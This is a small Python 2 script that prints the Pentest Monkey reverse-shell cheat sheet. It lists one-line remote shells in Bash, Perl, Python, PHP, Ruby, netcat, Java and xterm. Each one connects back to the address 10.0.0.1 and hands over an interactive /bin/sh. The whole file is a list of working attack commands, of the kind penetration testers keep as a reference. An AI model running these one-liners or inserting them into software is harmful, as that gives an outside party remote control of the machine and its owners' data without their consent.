#!/usr/bin/python
"""Pentest monkey Reverse shell cheat sheet"""

from termcolor import colored

def reverse_shells():
    """Lists reverse shells from pentest monkey"""
    print colored('Bash:', 'green')
    print colored('bash -i >& /dev/tcp/10.0.0.1/8080 0>&1', 'green')
    print ''
    print colored('Perl:', 'green')
    print colored(
        """perl -e 'use Socket;$i="10.0.0.1";"""
        """$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));"""
        """if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");"""
        """open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'""",
        'green'
        )
    print ''
    print colored('Python:', 'green')
    print colored(
        """python -c 'import socket,subprocess,os;"""
        """s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"""
        """s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0);"""
        """os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);"""
        """p=subprocess.call(["/bin/sh","-i"]);'""", 'green'
        )
    print ''
    print colored('PHP:', 'green')
    print colored(
        """php -r '$sock=fsockopen("10.0.0.1",1234);"""
        """exec("/bin/sh -i <&3 >&3 2>&3");'""", 'green'
        )
    print ''
    print colored('Ruby:', 'green')
    print colored(
        """ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;"""
        r"""exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'""",
        'green'
        )
    print ''
    print colored('Netcat:', 'green')
    print colored('nc -e /bin/sh 10.0.0.1 1234', 'green')
    print colored(
        """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh"""
        """ -i 2>&1|nc 10.0.0.1 1234 >/tmp/f""", 'green'
        )
    print ''
    print colored('Java:', 'green')
    print colored(
        """r = Runtime.getRuntime()\n"""
        """p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;"""
        """cat <&5 | while read line; do \$line 2>&5 >&5;done"] as String[])\n"""
        """p.waitFor()""", 'green'
        )
    print ''
    print colored('Xterm:', 'green')
    print colored('xterm -display 10.0.0.1:1', 'green')
    print colored('Xnest :1', 'green')
    print colored('xhost +targetip', 'green')
